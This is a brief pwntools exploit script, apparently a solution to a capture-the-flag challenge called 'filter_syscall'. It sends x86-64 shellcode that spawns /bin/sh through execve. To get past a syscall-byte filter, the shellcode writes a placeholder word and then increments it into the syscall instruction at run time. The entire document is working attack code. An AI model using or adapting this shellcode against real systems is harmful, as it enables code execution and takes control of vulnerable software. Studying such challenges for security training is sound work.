from pwn import *

context.arch = 'amd64'

io = process('../challenge/filter_syscall')
gdb.attach(io)

shellcode = '''
mov rax, %d
push rax

mov rdi, rsp
mov rsi, 0
mov rdx, 0
mov rax, 0x3b
inc BYTE PTR [rip]
.word 0x050e
''' % u64('/bin/sh\0')

io.sendline(asm(shellcode))

io.interactive()
